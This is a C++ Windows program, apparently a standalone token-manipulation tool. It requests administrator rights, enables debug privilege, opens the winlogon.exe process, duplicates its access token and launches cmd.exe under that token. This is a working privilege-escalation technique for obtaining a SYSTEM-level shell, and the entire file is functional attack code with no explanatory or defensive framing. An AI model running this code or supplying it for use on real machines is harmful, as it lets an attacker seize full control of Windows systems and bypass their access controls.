#include <iostream>
#include <Windows.h>
#include <lm.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")

using namespace std;

bool IsUserAdmin() {
    BOOL b;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdminGroups;
    b = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdminGroups);

    if (b) {
        if (!CheckTokenMembership(NULL, AdminGroups, &b)){
            b = FALSE;
        }
        FreeSid(AdminGroups);
    }
    return b != 0;
}

DWORD GetProcessID(LPCTSTR processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        cerr << "CreateToolhelp32Snapshot failed: " << GetLastError() << endl;
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_tcscmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    else {
        cerr << "Process32First failed: " << GetLastError() << endl;
    }

    CloseHandle(hSnapshot);
    return pid;
}


void EnablePrivileges(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        cerr << "LookupPrivilegeValue error: " << GetLastError() << endl;
        return;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        cerr << "AdjustTokenPrivileges error: " << GetLastError() << endl;
        return;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        cerr << "The token does not have the specified privilege." << endl;
    }
}

int main() {
#ifdef _WIN32
    if (!IsUserAdmin()) {
        if (ShellExecute(NULL, L"runas", L"tokenmanipulation.exe", NULL, NULL, SW_SHOWNORMAL)){
            return EXIT_SUCCESS;
        }
        else {
            return EXIT_FAILURE;
            exit(0);
        }
    }
    else {
        cout << "[+] Program Starts with Admin Privilages" << endl;
    }

    const TCHAR* processName = _T("winlogon.exe");
    DWORD pid_impersonate;
    pid_impersonate = GetProcessID(processName);

    HANDLE hTokenHandle = NULL;
    HANDLE DuplicateTokenHandle = NULL;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFO);

    HANDLE CurrentTokenHandle = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle)) {
        cerr << "OpenProcessToken error: " << GetLastError() << endl;
        return 1;
    }

    EnablePrivileges(CurrentTokenHandle, SE_DEBUG_NAME, TRUE);

    HANDLE rProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid_impersonate);
    if (rProcess == NULL) {
        cerr << "OpenProcess error: " << GetLastError() << endl;
        return 1;
    }

    if (!OpenProcessToken(rProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hTokenHandle)) {
        cerr << "OpenProcessToken error: " << GetLastError() << endl;
        CloseHandle(rProcess);
        return 1;
    }

    if (!ImpersonateLoggedOnUser(hTokenHandle)) {
        cerr << "ImpersonateLoggedOnUser error: " << GetLastError() << endl;
        CloseHandle(hTokenHandle);
        CloseHandle(rProcess);
        return 1;
    }

    if (!DuplicateTokenEx(hTokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateTokenHandle)) {
        cerr << "DuplicateToken error: " << GetLastError() << endl;
        CloseHandle(hTokenHandle);
        CloseHandle(rProcess);
        return 1;
    }

    if (!CreateProcessWithTokenW(DuplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi)) {
        cerr << "CreateProcessWithToken error: " << GetLastError() << endl;
        CloseHandle(DuplicateTokenHandle);
        CloseHandle(hTokenHandle);
        CloseHandle(rProcess);
        return 1;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(DuplicateTokenHandle);
    CloseHandle(hTokenHandle);
    CloseHandle(rProcess);

#else
    cerr << "[-] Operating System is not Windows";
    return 1;
#endif

    return 0;
}
